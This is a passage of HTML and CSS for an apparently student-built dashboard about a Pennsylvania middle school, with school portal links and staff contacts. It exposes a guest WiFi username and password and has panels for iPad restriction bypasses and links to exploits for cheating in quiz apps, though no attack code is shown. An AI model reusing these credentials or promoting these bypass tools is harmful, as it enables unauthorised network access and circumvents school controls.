      display: flex;
      flex-direction: column;
      transition: transform 0.2s, box-shadow 0.2s;
      border: 1px solid #ffb6c1;
    }
    body.dashboard-body.light-theme .file-browser {
      background-color: #fff0f5; /* Light pink */
      box-shadow: 0 0 15px rgba(255, 182, 193, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
      border-color: #ffc0cb;
    }
    .file-browser:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(255, 182, 193, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .file-browser:hover {
      box-shadow: 0 0 25px rgba(255, 182, 193, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .file-browser h3 {
      font-size: 18px;
      margin-bottom: 15px;
      color: #ff69b4; /* Hot pink heading */
      font-family: 'Orbitron', sans-serif;
      border-bottom: 1px solid #ff1493;
      padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .file-browser h3 {
      color: #cc3366;
      border-bottom-color: #ff69b4;
    }
    .file-list {
        list-style: none;
        padding: 0;
        margin: 0;
        flex-grow: 1;
        overflow-y: auto;
    }
    .file-list li {
        display: flex;
        align-items: center;
        padding: 8px 10px;
        border-radius: 6px;
        cursor: pointer;
        transition: background-color 0.2s, transform 0.1s;
        margin-bottom: 5px;
    }
    .file-list li:hover {
        background-color: #444;
        transform: translateX(5px);
    }
    body.dashboard-body.light-theme .file-list li:hover {
        background-color: #ffe6ee;
    }
    .file-list li.folder {
        font-weight: bold;
        color: #ffc0cb; /* Lighter pink for folders */
    }
    body.dashboard-body.light-theme .file-list li.folder {
        color: #cc3366;
    }
    .file-list li.file {
        color: #f9f2dc; /* Default file color */
    }
    body.dashboard-body.light-theme .file-list li.file {
        color: #660033; /* Darker pink for files */
    }
    .file-list li i { /* Folder/file icon */
        margin-right: 10px;
        font-size: 1.1em;
    }

    /* Process Manager Section */
    .process-manager-container {
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(128, 0, 128, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Purple theme */
      min-height: 200px;
      display: flex;
      flex-direction: column;
      border: 1px solid #9370db; /* Medium purple */
    }
    body.dashboard-body.light-theme .process-manager-container {
      background-color: #f8f0ff; /* Light purple */
      box-shadow: 0 0 15px rgba(128, 0, 128, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
      border-color: #8a2be2; /* Blue violet */
    }
    .process-manager-container:hover {
      box-shadow: 0 0 25px rgba(128, 0, 128, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .process-manager-container:hover {
      box-shadow: 0 0 25px rgba(128, 0, 128, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .process-manager-container h3 {
      font-size: 18px;
      margin-bottom: 15px;
      color: #da70d6; /* Orchid heading */
      font-family: 'Orbitron', sans-serif;
      border-bottom: 1px solid #8a2be2;
      padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .process-manager-container h3 {
      color: #8a2be2;
      border-bottom-color: #6a0dad;
    }
    .process-table {
        width: 100%;
        border-collapse: collapse;
        flex-grow: 1;
        overflow-y: auto; /* Make table scrollable */
    }
    .process-table th, .process-table td {
        padding: 10px 12px;
        text-align: left;
        border-bottom: 1px solid #444;
    }
    body.dashboard-body.light-theme .process-table th,
    body.dashboard-body.light-theme .process-table td {
        border-bottom-color: #ccc;
    }
    .process-table th {
        background-color: #3a3a3a;
        font-weight: bold;
        color: #ff914d;
        font-family: 'Orbitron', sans-serif;
    }
    body.dashboard-body.light-theme .process-table th {
        background-color: #d0d0d0;
        color: #994d00;
    }
    .process-table tbody tr:nth-child(even) {
        background-color: #333;
    }
    body.dashboard-body.light-theme .process-table tbody tr:nth-child(even) {
        background-color: #eee;
    }
    .process-table td {
        font-size: 0.9em;
    }
    .process-table td button { /* Kill process button */
        background-color: #e74c3c;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 0.8em;
        transition: background 0.2s;
    }
    .process-table td button:hover {
        background-color: #ff6666;
    }

    /* Reminders Section */
    .reminders-container {
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Gold theme */
      min-height: 200px;
      display: flex;
      flex-direction: column;
      border: 1px solid #daa520; /* Goldenrod border */
    }
    body.dashboard-body.light-theme .reminders-container {
      background-color: #fff8dc; /* Cornsilk */
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
      border-color: #b8860b; /* Dark goldenrod */
    }
    .reminders-container:hover {
      box-shadow: 0 0 25px rgba(255, 215, 0, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .reminders-container:hover {
      box-shadow: 0 0 25px rgba(255, 215, 0, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .reminders-container h3 {
      font-size: 18px;
      margin-bottom: 15px;
      color: #ffd700; /* Gold heading */
      font-family: 'Orbitron', sans-serif;
      border-bottom: 1px solid #daa520;
      padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .reminders-container h3 {
      color: #b8860b;
      border-bottom-color: #8b6508;
    }
    .reminder-form {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(0,0,0,0.2);
        border-radius: 8px;
    }
    body.dashboard-body.light-theme .reminder-form {
        background: rgba(255,255,255,0.2);
    }
    .reminder-form input[type="text"],
    .reminder-form input[type="datetime-local"],
    .reminder-form button {
        padding: 10px;
        border-radius: 6px;
        border: 1px solid #555;
        background: #333;
        color: #f9f2dc;
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme .reminder-form input[type="text"],
    body.dashboard-body.light-theme .reminder-form input[type="datetime-local"],
    body.dashboard-body.light-theme .reminder-form button {
        background: #eee;
        color: #333;
        border-color: #ccc;
    }
    .reminder-form button {
        background-color: #ff914d;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .reminder-form button:hover {
        background-color: #ffb67a;
    }
    .reminder-list {
        flex-grow: 1;
        overflow-y: auto;
        border-top: 1px solid #555;
        padding-top: 10px;
    }
    body.dashboard-body.light-theme .reminder-list {
        border-top-color: #ccc;
    }
    .reminder-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 10px;
        border-bottom: 1px solid #444;
        margin-bottom: 8px;
    }
    body.dashboard-body.light-theme .reminder-item {
        border-bottom-color: #ddd;
    }
    .reminder-text { flex-grow: 1; margin-right: 15px; }
    .reminder-time { color: #aaa; font-size: 0.9em; }
    body.dashboard-body.light-theme .reminder-time { color: #777; }
    .reminder-item button {
        background: #2ecc71;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 0.8em;
        transition: background 0.2s;
    }
    .reminder-item button:hover {
        background: #32cd7a;
    }

    /* Advanced Tools Panel */
    .advanced-tools-panel {
        background-color: #2a2a2a;
        padding: 25px;
        border-radius: 12px;
        box-shadow: 0 0 15px rgba(128, 0, 0, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Red theme */
        display: flex;
        flex-direction: column;
        border: 1px solid #dc143c; /* Crimson */
    }
    body.dashboard-body.light-theme .advanced-tools-panel {
        background-color: #fff0f0; /* Light red */
        box-shadow: 0 0 15px rgba(128, 0, 0, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
        border-color: #a00000; /* Darker red */
    }
    .advanced-tools-panel:hover {
        box-shadow: 0 0 25px rgba(128, 0, 0, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .advanced-tools-panel:hover {
        box-shadow: 0 0 25px rgba(128, 0, 0, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .advanced-tools-panel h3 {
        font-size: 18px;
        margin-bottom: 15px;
        color: #ff6347; /* Tomato heading */
        font-family: 'Orbitron', sans-serif;
        border-bottom: 1px solid #dc143c;
        padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .advanced-tools-panel h3 {
        color: #a00000;
        border-bottom-color: #800000;
    }
    .tool-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
        gap: 15px;
    }
    .tool-item {
        background-color: #3a3a3a;
        padding: 15px;
        border-radius: 8px;
        text-align: center;
        transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    body.dashboard-body.light-theme .tool-item {
        background-color: #ffe0e0;
        color: #800000;
    }
    .tool-item:hover {
        background-color: #444;
        transform: translateY(-3px);
        box-shadow: 0 5px 10px rgba(0,0,0,0.3);
    }
    body.dashboard-body.light-theme .tool-item:hover {
        background-color: #ffd0d0;
        box-shadow: 0 5px 10px rgba(0,0,0,0.2);
    }
    .tool-item h4 {
        font-size: 1.1em;
        margin-bottom: 10px;
        color: #ff6347;
    }
    body.dashboard-body.light-theme .tool-item h4 {
        color: #a00000;
    }
    .tool-item p {
        font-size: 0.9em;
        margin-bottom: 10px;
    }
    .tool-item button, .tool-item a {
        background-color: #ff4c4c;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
        text-decoration: none;
        display: inline-block; /* Make them behave like buttons */
        margin-top: 10px;
    }
    .tool-item button:hover, .tool-item a:hover {
        background-color: #ff7373;
    }
    body.dashboard-body.light-theme .tool-item button,
    body.dashboard-body.light-theme .tool-item a {
        background-color: #a00000;
        color: #fff8f8;
    }
    body.dashboard-body.light-theme .tool-item button:hover,
    body.dashboard-body.light-theme .tool-item a:hover {
        background-color: #800000;
    }


    /* Settings Panel */
    .settings-panel {
        background-color: #2a2a2a;
        padding: 25px;
        border-radius: 12px;
        box-shadow: 0 0 15px rgba(100, 149, 237, 0.3), 0 0 5px rgba(0,0,0,0.3) inset; /* Indigo theme */
        display: flex;
        flex-direction: column;
        border: 1px solid #4682b4; /* Steel blue */
    }
    body.dashboard-body.light-theme .settings-panel {
        background-color: #e0ffff; /* Light cyan */
        box-shadow: 0 0 15px rgba(100, 149, 237, 0.6), 0 0 5px rgba(255,255,255,0.3) inset;
        border-color: #005f91;
    }
    .settings-panel:hover {
        box-shadow: 0 0 25px rgba(100, 149, 237, 0.5), 0 0 10px rgba(0,0,0,0.4) inset;
    }
    body.dashboard-body.light-theme .settings-panel:hover {
        box-shadow: 0 0 25px rgba(100, 149, 237, 0.8), 0 0 10px rgba(255,255,255,0.5) inset;
    }
    .settings-panel h3 {
        font-size: 18px;
        margin-bottom: 15px;
        color: #6495ed; /* Cornflower blue heading */
        font-family: 'Orbitron', sans-serif;
        border-bottom: 1px solid #4682b4;
        padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .settings-panel h3 {
        color: #005f91;
        border-bottom-color: #004161;
    }
    .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 15px 0;
        border-bottom: 1px solid #444;
        margin-bottom: 10px;
    }
    body.dashboard-body.light-theme .setting-item {
        border-bottom-color: #ccc;
    }
    .setting-item:last-child {
        border-bottom: none;
        margin-bottom: 0;
    }
    .setting-label {
        font-size: 1.05em;
        font-weight: 500;
    }
    .setting-control {
        display: flex;
        align-items: center;
        gap: 15px;
    }
    .setting-control input[type="checkbox"] {
        width: 25px;
        height: 25px;
        cursor: pointer;
        accent-color: #6495ed;
    }
    body.dashboard-body.light-theme .setting-control input[type="checkbox"] {
        accent-color: #005f91;
    }
    .setting-control select {
        padding: 8px 12px;
        border-radius: 6px;
        border: 1px solid #555;
        background: #333;
        color: #f9f2dc;
        font-size: 0.95em;
        cursor: pointer;
    }
    body.dashboard-body.light-theme .setting-control select {
        background: #eee;
        color: #333;
        border-color: #ccc;
    }
    .setting-control button {
        background-color: #ff914d;
        color: black;
        border: none;
        padding: 10px 15px;
        border-radius: 6px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .setting-control button:hover {
        background-color: #ffb67a;
    }


  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Font Awesome for icons (optional, but good for flair) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>

<body id="bodyElement">

  <!-- Preloader Overlay -->
  <div id="preloaderOverlay">
    <div class="loader-screen" id="preloaderScreen1">
        <div class="loader-title">Initializing System...</div>
        <div class="loading-bar-container">
            <div class="loading-bar" id="preloaderBar1"></div>
        </div>
    </div>
    <div class="loader-screen" id="preloaderScreen2" style="opacity: 0; transform: translateY(-50px);">
        <div class="loader-title">Authenticating Key System...</div>
        <div class="loading-bar-container">
            <div class="loading-bar" id="preloaderBar2"></div>
        </div>
    </div>
    <div class="loader-screen" id="preloaderScreen3" style="opacity: 0; transform: translateY(-50px);">
        <div class="loader-title">Loading User Interface...</div>
        <div class="loading-bar-container">
            <div class="loading-bar" id="preloaderBar3"></div>
        </div>
    </div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="Enter Reset Code..." autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard -->
  <div id="dashboard" style="display: none; width: 100%; height: 100vh; overflow: hidden;">
    
    <!-- Header -->
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.9.9</div>
    </div>
    
    <!-- Notification Area -->
    <div id="notificationArea">
        <!-- Notifications will be added here -->
    </div>

    <div class="main-content-wrapper">
        <!-- Sidebar Navigation -->
        <div class="sidebar">
            <h3>Navigation</h3>
            <div class="sidebar-nav">
                <button data-section="home" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard Home</button>
                <button data-section="monitor"><i class="fas fa-server"></i> System Monitor</button>
                <button data-section="terminal"><i class="fas fa-terminal"></i> Terminal</button>
                <button data-section="filemanager"><i class="fas fa-folder-open"></i> File Manager</button>
                <button data-section="processes"><i class="fas fa-cogs"></i> Process Manager</button>
                <button data-section="reminders"><i class="fas fa-bell"></i> Reminders</button>
                <button data-section="tools"><i class="fas fa-tools"></i> Advanced Tools</button>
                <button data-section="settings"><i class="fas fa-cog"></i> Settings</button>
            </div>
        </div>

        <!-- Content Area -->
        <div class="content-area">
            
            <!-- Dashboard Home Section -->
            <div id="homeSection" class="content-section active">
                <div class="quick-bar">
                  <button id="sessionTime">⏳ Session Time: 00:00:00</button>
                  <button id="realTimeClock">🕒 --:--:--</button>
                  <button id="realDate">📅 --</button>
                  <button id="notesBtn">📒 Notes</button>
                  <button id="exportNotesBtn">💾 Export Notes</button>
                  <button id="screenshotBtn">📸 Screenshot</button>
                  <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
                  <button id="fixIssuesBtn">🛠️ Fix Issues</button>
                  <button id="fullScreenBtn">🖥️ Full Screen</button>
                  <button id="zoomInBtn">➕ Zoom In</button>
                  <button id="zoomOutBtn">➖ Zoom Out</button>
                  <button id="restartBtn">🔄 Restart</button>
                  <button id="panicBtn">🚨 Panic</button>
                  <button id="themeToggle">🌙 Dark Mode</button>
                  <button id="logoutBtn">🔓 Log Out</button>
                </div>
                
                <div id="announcementBar" class="announcement-bar">
                  <span>🚀 Enhanced Dashboard v1.9.9 is LIVE! Featuring new simulations and improved UI! 🚀</span>
                </div>
                
                <div class="main-grid">
                  
                  <div class="box">
                    <h2>📅 Calendar</h2>
                    <div class="calendar-container">
                        <div class="calendar" id="calendar"></div>
                    </div>
                  </div>
            
                  <div class="box motivation-box" id="motivationBox">
                    "The future belongs to those who believe in the beauty of their dreams." – Eleanor Roosevelt
                  </div>
                </div>
            
                <div id="updatesNotifications">
                  <div class="box" style="flex: 1 1 300px; min-width: 280px;">
                    <h2>🔄 System Updates</h2>
                    <div class="update-entry">Dashboard UI Overhaul Complete!</div>
                    <div class="update-entry">System Monitor Accuracy Improved.</div>
                    <div class="update-entry">New Security Protocols Implemented.</div>
                    <div class="update-entry">Added File Manager simulation.</div>
                    <div class="update-entry">Terminal command expansion.</div>
                  </div>
            
                  <div class="box" style="flex: 1 1 300px; min-width: 280px;">
                    <h2>🔔 System Notifications</h2>
                    <p>User login successful. Welcome back!</p>
                    <p>System resource usage nominal.</p>
                    <p>All modules operating within expected parameters.</p>
                  </div>
                </div>
            
                <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
                  <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
                  <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
                  <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks</button>
                  <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map</button>
                  <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Websites</button>
                  <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites</button>
                  <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory</button>
                  <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Feed</button>
                  <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
                  <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
                  <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
                  <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
                  <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
                  <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
                  <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
                </div>
            
                <!-- Information Panels -->
                <div id="infoPanelsContainer" style="margin-top: 20px;">
                  <!-- WiFi Panel -->
                  <div id="wifiPanel" class="info-panel">
                    <h2>📡 School WiFi Information</h2>
                    <div class="wifi-grid">
                      <div>Network Name</div>
                      <div>Level</div>
                      <div>Security</div>
                      <div>Encryption</div>
                      <div>Hidden?</div>
                      <div>Monitored?</div>
                      <div>Username</div>
                      <div>Password</div>
                    </div>
                    <div class="wifi-entry">
                      <div>Middletown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>No</div><div>Yes</div><div>Unknown</div><div>Unknown</div>
                    </div>
                    <div class="wifi-entry">
                      <div>Mtown_Core</div><div>High</div><div>WPA3 Enterprise</div><div>High</div><div>Yes</div><div>Unknown</div><div>Unknown</div><div>Unknown</div>
                    </div>
                    <div class="wifi-entry">
                      <div>Mtown Guest</div><div>Medium</div><div>WPA3 Enterprise</div><div>Medium</div><div>No</div><div>Rare</div><div>msguest</div><div>M@ms2021#</div>
                    </div>
                    <div class="wifi-entry">
                      <div>Radius Test</div><div>Low</div><div>WPA3 Enterprise</div><div>Low</div><div>No</div><div>Rarely</div><div>msguest</div><div>M@ms2021#</div>
                    </div>
                  </div>
            
                  <!-- iPad Panel -->
                  <div id="ipadPanel" class="info-panel">
                    <h2>📱 School iPad Restrictions</h2>
                    <div class="ipad-options">
                      <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
                      <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
                    </div>
                    <div id="ipadRestrictions" class="ipad-content"><p>Managed by MDM. Limited app installation. Safari content filtering enabled.</p></div>
                    <div id="ipadBypasses" class="ipad-content"><p>Limited access to web-based bypasses through managed profiles.</p></div>
                  </div>
            
                  <!-- Handbook Panel -->
                  <div id="handbookPanel" class="info-panel">
                    <h2>📘 Student Handbooks</h2>
                    <div class="handbook-buttons">
                      <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
                      <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
                      <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
                      <a href="https://middletownsd.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
                      <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
                      <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (24-25)</a>
                    </div>
                  </div>
            
                  <!-- Map Panel -->
                  <div id="mapPanel" class="info-panel">
                    <h2>🏫 School Building Map</h2>
                    <div class="coming-soon">Building Floor Plan Coming Soon!</div>
                  </div>
            
                  <!-- Student Websites Panel -->
                  <div id="studentWebsitesPanel" class="info-panel">
                    <h2>🌐 Student Websites</h2>
                    <div class="links-list">
                      <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
                      <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas</a>
                      <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                      <a href="https://clever.com/in/middletownsd" target="_blank">Clever Portal</a>
                      <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
                      <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                      <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
                      <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
                      <a href="https://id.naviance.com" target="_blank">Naviance</a>
                      <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                      <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
                      <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                      <a href="https://www.safe2saypa.org" target="_blank">Safe2SayPA</a>
                      <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
                      <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour Yearbook</a>
                      <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
                    </div>
                  </div>
            
                  <!-- Teacher Websites Panel -->
                  <div id="teacherWebsitesPanel" class="info-panel">
                    <h2>👩‍🏫 Teacher Websites</h2>
                    <div class="links-list">
                      <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
                      <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
                      <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
                      <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
                      <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Guernsey Store</a>
                      <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
                      <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
                      <a href="https://clever.com/in/middletownsd" target="_blank">Clever Portal (Teacher)</a>
                      <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
                      <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
                      <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
                      <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
                      <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline Education</a>
                      <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
                      <a href="https://id.naviance.com" target="_blank">Naviance</a>
                      <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
                      <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
                      <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
                      <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
                      <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
                      <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
                      <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
                      <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox Support</a>
                      <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
                      <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365 Portal</a>
                    </div>
                  </div>
            
                  <!-- Phone Directory Panel -->
                  <div id="phoneDirectoryPanel" class="info-panel">
                    <h2>📞 School Phone Directory</h2>
                    <div class="coming-soon">Directory details updated regularly.</div>
                  </div>
            
                  <!-- Camera Panel -->
                  <div id="cameraPanel" class="info-panel">
                    <h2>📷 School Camera Feed</h2>
                    <div class="coming-soon">Live feeds require authorized access.</div>
                  </div>
            
                  <!-- School Info Panel -->
                  <div id="schoolInfoPanel" class="info-panel">
                    <h2>🏫 School Information</h2>
                    <div class="school-info-grid">
                      <div class="school-info-item">
                        <div class="school-info-label">School Name:</div><div>Middletown Area Middle School</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Address:</div><div>215 Oberlin Road Middletown, PA 17057</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Phone:</div><div>717-930-0739</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Fax:</div><div>717-944-0591</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Principal:</div><div>Dr. Shannon L. Wevodau</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Principal's Phone:</div><div>717-930-0739</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Principal's Email:</div><div>swevodau@raiderweb.org</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Assistant Principal:</div><div>Mr. Michael DeFilippo</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Asst. Principal's Phone:</div><div>717-930-0739</div>
                      </div>
                      <div class="school-info-item">
                        <div class="school-info-label">Asst. Principal's Email:</div><div>mdefilippo@raiderweb.org</div>
                      </div>
                    </div>
                  </div>
            
                  <!-- Exploit Panel -->
                  <div id="exploitPanel" class="info-panel">
                    <h2>🧨 Exploiting Tools</h2>
                    <div class="exploit-buttons">
                      <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/kahoot-exploit" target="_blank">Kahoot Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/gimkit-exploit" target="_blank">Gimkit Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/quizlet-exploit" target="_blank">Quizlet Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/quizzes-exploit" target="_blank">Quizzes Exploit</a>
                      <a href="https://sites.google.com/view/tools-2/quills-exploit" target="_blank">Quills Exploit</a>
